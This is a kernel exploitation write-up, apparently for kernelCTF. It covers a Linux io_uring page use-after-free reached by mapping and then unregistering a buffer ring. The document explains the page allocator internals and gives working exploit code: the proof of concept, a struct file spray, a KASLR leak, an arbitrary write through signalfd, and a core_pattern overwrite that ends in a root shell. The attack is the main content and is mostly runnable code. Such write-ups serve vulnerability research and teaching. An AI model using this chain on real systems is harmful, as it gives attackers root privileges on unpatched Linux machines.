## Trigger the Vulnerability

The `io_uring_register` syscall supports various registration ops to allow a user to register different resources that `io_uring` can use. Specifically, with `IORING_REGISTER_PBUF_RING` combined with the `IOU_PBUF_RING_MMAP` flag, the kernel allocates pages for an `io_buffer_list` and attaches it to the `io_ring_ctx` under a given `bgid`.

```c
int io_register_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg)
{
	struct io_uring_buf_reg reg;
	struct io_buffer_list *bl, *free_bl = NULL;
	int ret;

	if (copy_from_user(&reg, arg, sizeof(reg)))
		return -EFAULT;
/*...*/
    
	if (!(reg.flags & IOU_PBUF_RING_MMAP))
		ret = io_pin_pbuf_ring(&reg, bl);
	else
		ret = io_alloc_pbuf_ring(&reg, bl);	// <-- IOU_PBUF_RING_MMAP

	if (!ret) {
		bl->nr_entries = reg.ring_entries;
		bl->mask = reg.ring_entries - 1;

		io_buffer_add_list(ctx, bl, reg.bgid);	// <-- add buffer_list to ctx with bgid
		return 0;
	}

	kfree(free_bl);
	return ret;
}
```

In the `io_alloc_pbuf_ring()` function below, the kernel uses `__get_free_pages()` to allocate pages for the buffer ring:

```c
static int io_alloc_pbuf_ring(struct io_uring_buf_reg *reg,
			      struct io_buffer_list *bl)
{
	gfp_t gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;
	size_t ring_size;
	void *ptr;

	ring_size = reg->ring_entries * sizeof(struct io_uring_buf_ring);
	ptr = (void *) __get_free_pages(gfp, get_order(ring_size));
	if (!ptr)
		return -ENOMEM;

	bl->buf_ring = ptr;
	bl->is_mapped = 1;
	bl->is_mmap = 1;
	return 0;
}
```

Later, from userspace, one can request to mmap the buffer via a `vm_pgoff` that encodes both the `bgid` and `IORING_OFF_PBUF_RING`. 

The internal function `io_uring_validate_mmap_request()` checks which resource is being requested ({SQ, CQ} ring, SQEs, or pbuf ring) and returns the corresponding kernel virtual address:

```c
static void *io_uring_validate_mmap_request(struct file *file,
					    loff_t pgoff, size_t sz)
{
	struct io_ring_ctx *ctx = file->private_data;
	loff_t offset = pgoff << PAGE_SHIFT;
	struct page *page;
	void *ptr;

	if (ctx->flags & IORING_SETUP_NO_MMAP)
		return ERR_PTR(-EINVAL);

	switch (offset & IORING_OFF_MMAP_MASK) {
	case IORING_OFF_SQ_RING:
	case IORING_OFF_CQ_RING:
		ptr = ctx->rings;
		break;
	case IORING_OFF_SQES:
		ptr = ctx->sq_sqes;
		break;
	case IORING_OFF_PBUF_RING: {
		unsigned int bgid;

		bgid = (offset & ~IORING_OFF_MMAP_MASK) >> IORING_OFF_PBUF_SHIFT;
		mutex_lock(&ctx->uring_lock);
		ptr = io_pbuf_get_address(ctx, bgid);	// <-- get registered buffer from ctx according to bgid
		mutex_unlock(&ctx->uring_lock);
		if (!ptr)
			return ERR_PTR(-EINVAL);
		break;
		}
	default:
		return ERR_PTR(-EINVAL);
	}

	page = virt_to_head_page(ptr);
	if (sz > page_size(page))
		return ERR_PTR(-EINVAL);

	return ptr;
}
```

The call to `io_uring_validate_mmap_request()` returns the kernelâ€™s base address of the buffer ring. Then `io_uring_mmap()` does:

```c
static __cold int io_uring_mmap(struct file *file, struct vm_area_struct *vma)
{
	size_t sz = vma->vm_end - vma->vm_start;
	unsigned long pfn;
	void *ptr;

	ptr = io_uring_validate_mmap_request(file, vma->vm_pgoff, sz);
	if (IS_ERR(ptr))
		return PTR_ERR(ptr);

	pfn = virt_to_phys(ptr) >> PAGE_SHIFT;
	return remap_pfn_range(vma, vma->vm_start, pfn, sz, vma->vm_page_prot);
```

A user can unregister this buffer via `IORING_UNREGISTER_PBUF_RING`. Internally, the kernel will free the pages or unpin them accordingly.

```c
int io_unregister_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg)
{
	struct io_uring_buf_reg reg;
	struct io_buffer_list *bl;

	if (copy_from_user(&reg, arg, sizeof(reg)))
		return -EFAULT;
	if (reg.resv[0] || reg.resv[1] || reg.resv[2])
		return -EINVAL;
	if (reg.flags)
		return -EINVAL;

	bl = io_buffer_get_list(ctx, reg.bgid);	// <-- get registered buffer_list from ctx according to bgid
	if (!bl)
		return -ENOENT;
	if (!bl->is_mapped)
		return -EINVAL;

	__io_remove_buffers(ctx, bl, -1U);	// <-- remove buffer
	if (bl->bgid >= BGID_ARRAY) {
		xa_erase(&ctx->io_bl_xa, bl->bgid);
		kfree(bl);
	}
	return 0;
}

static int __io_remove_buffers(struct io_ring_ctx *ctx,
			       struct io_buffer_list *bl, unsigned nbufs)
{
	unsigned i = 0;

	/* shouldn't happen */
	if (!nbufs)
		return 0;

	if (bl->is_mapped) {
		i = bl->buf_ring->tail - bl->head;
		if (bl->is_mmap) {
			folio_put(virt_to_folio(bl->buf_ring));	// <-- refcount--
			bl->buf_ring = NULL;
			bl->is_mmap = 0;
		} else if (bl->buf_nr_pages) {
			int j;

			for (j = 0; j < bl->buf_nr_pages; j++)
				unpin_user_page(bl->buf_pages[j]);
			kvfree(bl->buf_pages);
			bl->buf_pages = NULL;
			bl->buf_nr_pages = 0;
		}
		/* make sure it's seen as empty */
		INIT_LIST_HEAD(&bl->buf_list);
		bl->is_mapped = 0;
		return i;
	}
/*...*/
}
```

Notice the call to `folio_put(virt_to_folio(bl->buf_ring))`, which decrements the folio/page reference count.

The vulnerability is that `remap_pfn_range()` is a lower-level API tha map a given physical address range into userspace creating `VM_PFNMAP` VMAs. `VM_PFNMAP` mappings are special, because unlike normal memory mappings, there is no lifetime information associated with the mapping - it is just a raw mapping of PFNs with no reference counting of a 'struct page';  therefore, the caller is responsible for holding references to the page as long as it is mapped into userspace.

```c
static __cold int io_uring_mmap(struct file *file, struct vm_area_struct *vma)
{
	size_t sz = vma->vm_end - vma->vm_start;
	unsigned long pfn;
	void *ptr;

	ptr = io_uring_validate_mmap_request(file, vma->vm_pgoff, sz);
	if (IS_ERR(ptr))
		return PTR_ERR(ptr);

	pfn = virt_to_phys(ptr) >> PAGE_SHIFT;
	return remap_pfn_range(vma, vma->vm_start, pfn, sz, vma->vm_page_prot);
```

So if a user registers a buffer ring with `IORING_REGISTER_PBUF_RING`, `mmap()` it, and then frees it with `IORING_UNREGISTER_PBUF_RING`, the user will gain the ability to read or write already freed pages, it's a well-known universal root primitive.

A poc taken from [Linux >=6.4: io_uring: page UAF via buffer ring mmap - Project Zero](https://project-zero.issues.chromium.org/issues/42451653):

```c
#define _GNU_SOURCE
#include <err.h>
#include <linux/io_uring.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define SYSCHK(x) ({ \
typeof(x) __res = (x); \
if (__res == (typeof(x))-1) \
err(1, "SYSCHK(" #x ")"); \
__res; \
})

int main(void) {
  struct io_uring_params params = {.flags = IORING_SETUP_NO_SQARRAY};
  int uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/40, &params));
  printf("uring_fd = %d\n", uring_fd);

  struct io_uring_buf_reg reg = {
      .ring_entries = 1, .bgid = 0, .flags = IOU_PBUF_RING_MMAP};
  SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_PBUF_RING,
                 &reg, 1));

  void *pbuf_mapping = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                                   MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING));
  printf("pbuf mapped at %p\n", pbuf_mapping);

  struct io_uring_buf_reg unreg = {.bgid = 0};
  SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_UNREGISTER_PBUF_RING,
                 &unreg, 1));
  while (1) {
    memset(pbuf_mapping, 0xaa, 0x1000);
    usleep(100000);
  }
}
```

## Revisit of Page UAF

Since page UAF is a very powerful primitive, exploit is quite easy and straightforward.  Before we go ahead into the trivial exploit part, let's revisit how page UAF works, especially on kernelCTF's hardened mitigation instance.

### PCP(per_cpu_pages) list & migratetype

#### folio_put

If a folio's reference count drops to zero, the memory will be released back to the page allocator and may be used by another allocation immediately.

``` c
static inline void folio_put(struct folio *folio)
{
	if (folio_put_testzero(folio))
		__folio_put(folio);
}

void __folio_put(struct folio *folio)
{
	if (unlikely(folio_is_zone_device(folio)))
		free_zone_device_page(&folio->page);
	else if (unlikely(folio_test_large(folio)))	// <-- multi-page folio?
		__folio_put_large(folio);
	else
		__folio_put_small(folio);
}
```

Normally, depending on the folio type, the call flows into either the single-page or multi-page release path:

```c
// ðŸ‘‡ single page release path
static void __folio_put_small(struct folio *folio)
{
	__page_cache_release(folio);
	mem_cgroup_uncharge(folio);
	free_unref_page(&folio->page, 0);	// <-- try free via pcp
}

// ðŸ‘‡ multiple page release path
static void __folio_put_large(struct folio *folio)
{
	if (!folio_test_hugetlb(folio))
		__page_cache_release(folio);
	destroy_large_folio(folio);
}

void destroy_large_folio(struct folio *folio)
{
	if (folio_test_hugetlb(folio)) {
		free_huge_folio(folio);
		return;
	}

	if (folio_test_large_rmappable(folio))
		folio_undo_large_rmappable(folio);

	mem_cgroup_uncharge(folio);
	free_the_page(&folio->page, folio_order(folio));
}
```

The function `free_the_page()` decides whether to place the pages into the PCP list or release them directly to the buddy allocator:

```c
#define PAGE_ALLOC_COSTLY_ORDER 3

static inline bool pcp_allowed_order(unsigned int order)
{
	if (order <= PAGE_ALLOC_COSTLY_ORDER)
		return true;
#ifdef CONFIG_TRANSPARENT_HUGEPAGE
	if (order == pageblock_order)
		return true;
#endif
	return false;
}

static inline void free_the_page(struct page *page, unsigned int order)
{
	if (pcp_allowed_order(order))		/* Via pcp? */
		free_unref_page(page, order);
	else
		__free_pages_ok(page, order, FPI_NONE);
}
```

If the released pages meet all of these conditions:

- `migratetype < MIGRATE_PCPTYPES`
- `order <= PAGE_ALLOC_COSTLY_ORDER`
-  `pcp->count` is below the `high` watermark

then they are added to the `pcp->lists[pindex]`(where `pindex` is calculated through `order` and `migratetype`) rather than immediately being returned to the buddy allocator. 

This logic is handled in `free_unref_page()` and `free_unref_page_commit()`:

```c
/*
 * Free a pcp page
 */
void free_unref_page(struct page *page, unsigned int order)
{
	unsigned long __maybe_unused UP_flags;
	struct per_cpu_pages *pcp;
	struct zone *zone;
	unsigned long pfn = page_to_pfn(page);
	int migratetype, pcpmigratetype;

	if (!free_unref_page_prepare(page, pfn, order))
		return;

	migratetype = pcpmigratetype = get_pcppage_migratetype(page);
	if (unlikely(migratetype >= MIGRATE_PCPTYPES)) {
		if (unlikely(is_migrate_isolate(migratetype))) {
			free_one_page(page_zone(page), page, pfn, order, migratetype, FPI_NONE);
			return;
		}
		pcpmigratetype = MIGRATE_MOVABLE;
	}

	zone = page_zone(page);
	pcp_trylock_prepare(UP_flags);
	pcp = pcp_spin_trylock(zone->per_cpu_pageset);
	if (pcp) {
		free_unref_page_commit(zone, pcp, page, pcpmigratetype, order);
		pcp_spin_unlock(pcp);
	} else {
		free_one_page(zone, page, pfn, order, migratetype, FPI_NONE);
	}
	pcp_trylock_finish(UP_flags);
}

static inline unsigned int order_to_pindex(int migratetype, int order)
{
/*...*/
    return (MIGRATE_PCPTYPES * order) + migratetype;
}

static void free_unref_page_commit(struct zone *zone, struct per_cpu_pages *pcp,
				   struct page *page, int migratetype,
				   unsigned int order)
{
	int high;
	int pindex;
	bool free_high;

	__count_vm_events(PGFREE, 1 << order);
	pindex = order_to_pindex(migratetype, order);
    // ðŸ‘‡ add to the pcp list
	list_add(&page->pcp_list, &pcp->lists[pindex]);
	pcp->count += 1 << order;

	free_high = (pcp->free_factor && order && order <= PAGE_ALLOC_COSTLY_ORDER);

	high = nr_pcp_high(pcp, zone, free_high);
	if (pcp->count >= high) {
		free_pcppages_bulk(zone, nr_pcp_free(pcp, high, free_high), pcp, pindex);
	}
}
```

#### __alloc_pages

When the kernel needs new pages, it calls `__alloc_pages()`, which then calls `get_page_from_freelist()`. Internally, the allocation logic tries to grab pages from the PCP list first (via `rmqueue_pcplist()`):

```c
/*
 * This is the 'heart' of the zoned buddy allocator.
 */
struct page *__alloc_pages(gfp_t gfp, unsigned int order, int preferred_nid,
							nodemask_t *nodemask)
{
/*...*/
	/* First allocation attempt */
	page = get_page_from_freelist(alloc_gfp, order, alloc_flags, &ac);
	if (likely(page))
		goto out;

/*...*/
    return page;
}


```

Inside `get_page_from_freelist()` and `rmqueue()`:

```c
/*
 * get_page_from_freelist goes through the zonelist trying to allocate
 * a page.
 */
static struct page *
get_page_from_freelist(gfp_t gfp_mask, unsigned int order, int alloc_flags,
						const struct alloc_context *ac)
{
	struct zoneref *z;
	struct zone *zone;
	struct pglist_data *last_pgdat = NULL;
	bool last_pgdat_dirty_ok = false;
	bool no_fallback;

/*...*/

try_this_zone:
		page = rmqueue(ac->preferred_zoneref->zone, zone, order,
				gfp_mask, alloc_flags, ac->migratetype);
		if (page) {
			prep_new_page(page, order, gfp_mask, alloc_flags);
			if (unlikely(alloc_flags & ALLOC_HIGHATOMIC))
				reserve_highatomic_pageblock(page, zone);
			return page;
		} 
/*...*/

	return NULL;
}

__no_sanitize_memory
static inline
struct page *rmqueue(struct zone *preferred_zone,
			struct zone *zone, unsigned int order,
			gfp_t gfp_flags, unsigned int alloc_flags,
			int migratetype)
{
	struct page *page;

	WARN_ON_ONCE((gfp_flags & __GFP_NOFAIL) && (order > 1));

	if (likely(pcp_allowed_order(order))) {	//	<-- order <= PAGE_ALLOC_COSTLY_ORDER
		page = rmqueue_pcplist(preferred_zone, zone, order,
				       migratetype, alloc_flags);
		if (likely(page))
			goto out;
	}

/*...*/
    
	VM_BUG_ON_PAGE(page && bad_range(zone, page), page);
	return page;
}
```

The routine `rmqueue_pcplist()` attempts to remove pages from the relevant PCP list (matching `order` and `migratetype`), and return them immediately. If it cannot find suitable pages, it falls back to the buddy free list.

```c
/* Lock and remove page from the per-cpu list */
static struct page *rmqueue_pcplist(struct zone *preferred_zone,
			struct zone *zone, unsigned int order,
			int migratetype, unsigned int alloc_flags)
{
	struct per_cpu_pages *pcp;
	struct list_head *list;
	struct page *page;
	unsigned long __maybe_unused UP_flags;

	/* spin_trylock may fail due to a parallel drain or IRQ reentrancy. */
	pcp_trylock_prepare(UP_flags);
	pcp = pcp_spin_trylock(zone->per_cpu_pageset);
	if (!pcp) {
		pcp_trylock_finish(UP_flags);
		return NULL;
	}

	pcp->free_factor >>= 1;
	list = &pcp->lists[order_to_pindex(migratetype, order)];
	page = __rmqueue_pcplist(zone, order, migratetype, alloc_flags, pcp, list);
	pcp_spin_unlock(pcp);
	pcp_trylock_finish(UP_flags);
	if (page) {
		__count_zid_vm_events(PGALLOC, page_zonenum(page), 1 << order);
		zone_statistics(preferred_zone, zone, 1);
	}
	return page;
}
```

### Conclusion

- Normally â€œsame order and same migratetypeâ€ pages get stored in the PCP list, which allows them to be quickly reused. 

- While freed slab's virtual address range can not be reused, pages discarded by freed slabs can still be reused once they are freed while flushing the TLB by `slub_tlbflush_worker`.

The above is the underlying logic of page UAF.

## Exploit Details

Pin cpu to a certain core to increase the exploit stability as later we need to play with PCP list:

```c
static void pin_cpu(int cpu_n, pid_t pid) {
  cpu_set_t set;

  CPU_ZERO(&set);
  CPU_SET(cpu_n, &set);

  if (sched_setaffinity(pid, sizeof(set), &set) < 0) {
    die("sched_setaffinity: %m");
  }
}

pin_cpu(0, getpid());
```

Setup io_uring:

```c
  struct io_uring_params params = {.flags = IORING_SETUP_NO_SQARRAY};
  int uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/40, &params));
```

Spray pbuf and mmap buffer in order to create multiple single-page UAFs at the same time to increase the exploit stability:

```c
  for (int i = 0; i < SPRAY_PBUF_NUM; i++) {
    struct io_uring_buf_reg reg = {
        .ring_entries = 1, .bgid = i, .flags = IOU_PBUF_RING_MMAP};
    SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_PBUF_RING,
                   &reg, 1));

    pbuf_mappings[i] =
        SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd,
                    IORING_OFF_PBUF_RING + (i << IORING_OFF_PBUF_SHIFT)));
    logi("[pbuf %d] mapped at %p", i, pbuf_mappings[i]);
  }
```

Trigger page UAF:

```c
  for (int i = 0; i < SPRAY_PBUF_NUM; i++) {
    struct io_uring_buf_reg unreg = {.bgid = i};
    SYSCHK(syscall(__NR_io_uring_register, uring_fd,
                   IORING_UNREGISTER_PBUF_RING, &unreg, 1));
  }
```

Spray enough `struct file` to reuse the UAF page from PCP list

```c
  char buf[1024] = {};
  for (int i = 0; i < SPRAY_FILE_NUM; i++) {
    spray_fds[i] = SYSCHK(open("/tmp/tmp_file", O_RDWR | O_CREAT, 0666));
    // later we can observe the write retval at victim_file->f_pos
    SYSCHK(write(spray_fds[i], buf, i));
  }
```

Locate victim_file:

```c
  void *victim_file_addr = NULL;
  for (int i = 0; i < SPRAY_PBUF_NUM; i++) {
    if (victim_file_addr)
      break;
    for (int j = 0; j < PAGE_SZ; j += ALIGNED_FILE_SZ) {
      size_t shmem_file_operations =
          *(size_t *)(pbuf_mappings[i] + j + OFFSET_FILE_FOP);
      if ((shmem_file_operations & 0xfffff) ==
          (SHMEM_FILE_OPERATIONS & 0xfffff)) {
        victim_file_addr = pbuf_mappings[i] + j;
        logi("victim_file_addr %p", victim_file_addr);
        break;
      }
    }
  }
```

Get victim_file index and leak kaslr:

```c
  size_t victim_file_idx = *(size_t *)(victim_file_addr + OFFSET_FILE_FPOS);
  size_t shmem_file_operations =
      *(size_t *)(victim_file_addr + OFFSET_FILE_FOP);
  size_t kaslr = shmem_file_operations - SHMEM_FILE_OPERATIONS;
  size_t signalfd_fops = SIGNALFD_FOPS + kaslr;
  size_t core_pattern = CORE_PATTERN + kaslr;
  size_t private_data_before =
      *(size_t *)(victim_file_addr + OFFSET_FILE_PRIV_DATA);
```

Abuse victim_file to get arbitrary write and overwrite the core_pattern:

```c
  *(size_t *)(victim_file_addr + OFFSET_FILE_FOP) = signalfd_fops;
  char *fake = "|/proc/%P/fd/666 %P";
  for (int i = 0; i <= strlen(fake); i++) { // include the null byte
    *(size_t *)(victim_file_addr + OFFSET_FILE_PRIV_DATA) = (core_pattern + i);
    size_t mask = ~fake[i];
    SYSCHK(signalfd(spray_fds[victim_file_idx], (const sigset_t *)&mask, 0));
  }
```

This technique can be checked at [Mind the Gap - Project Zero: November 2022](https://googleprojectzero.blogspot.com/2022/11/#:~:text=struct%20was%20incremented.-,Overwriting%20the%20addr_limit,-Like%20many%20previous):

```c
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
	struct signalfd_ctx *ctx;

	/* Check the SFD_* constants for consistency.  */
	BUILD_BUG_ON(SFD_CLOEXEC != O_CLOEXEC);
	BUILD_BUG_ON(SFD_NONBLOCK != O_NONBLOCK);

	if (flags & ~(SFD_CLOEXEC | SFD_NONBLOCK))
		return -EINVAL;

	sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));
	signotset(mask);

	if (ufd == -1) {
		ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);
		if (!ctx)
			return -ENOMEM;

		ctx->sigmask = *mask;

		/*
		 * When we call this, the initialization must be complete, since
		 * anon_inode_getfd() will install the fd.
		 */
		ufd = anon_inode_getfd("[signalfd]", &signalfd_fops, ctx,
				       O_RDWR | (flags & (O_CLOEXEC | O_NONBLOCK)));
		if (ufd < 0)
			kfree(ctx);
	} else {
		struct fd f = fdget(ufd);
		if (!f.file)
			return -EBADF;
		ctx = f.file->private_data;	//	<-- get priv_data
		if (f.file->f_op != &signalfd_fops) {
			fdput(f);
			return -EINVAL;
		}
		spin_lock_irq(&current->sighand->siglock);
		ctx->sigmask = *mask;	//	<-- write here
		spin_unlock_irq(&current->sighand->siglock);

		wake_up(&current->sighand->signalfd_wqh);
		fdput(f);
	}

	return ufd;
}

SYSCALL_DEFINE4(signalfd4, int, ufd, sigset_t __user *, user_mask,
		size_t, sizemask, int, flags)
{
	sigset_t mask;

	if (sizemask != sizeof(sigset_t))
		return -EINVAL;
	if (copy_from_user(&mask, user_mask, sizeof(mask)))
		return -EFAULT;
	return do_signalfd4(ufd, &mask, flags);
}
```

Then we trigger the core_pattern and execute program with root privilege:

```c
// core_pattern exploit taken from
// https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-52447_cos/exploit/cos-105-17412.294.10/exploit.c#L444
int check_core() {
  // Check if /proc/sys/kernel/core_pattern has been overwritten
  char buf[0x100] = {};
  int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  read(core, buf, sizeof(buf));
  close(core);
  return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}

void crash(char *cmd) {
  int memfd = memfd_create("", 0);
  SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
  dup2(memfd, 666);
  close(memfd);
  while (check_core() == 0)
    sleep(1);
  puts("Root shell !!");
  /* Trigger program crash and cause kernel to executes program from
   * core_pattern which is our "root" binary */
  *(size_t *)0 = 0;
}

  // trigger core_pattern exploit
  if (fork() == 0)
    crash("");
  while (1)
    sleep(100);
```

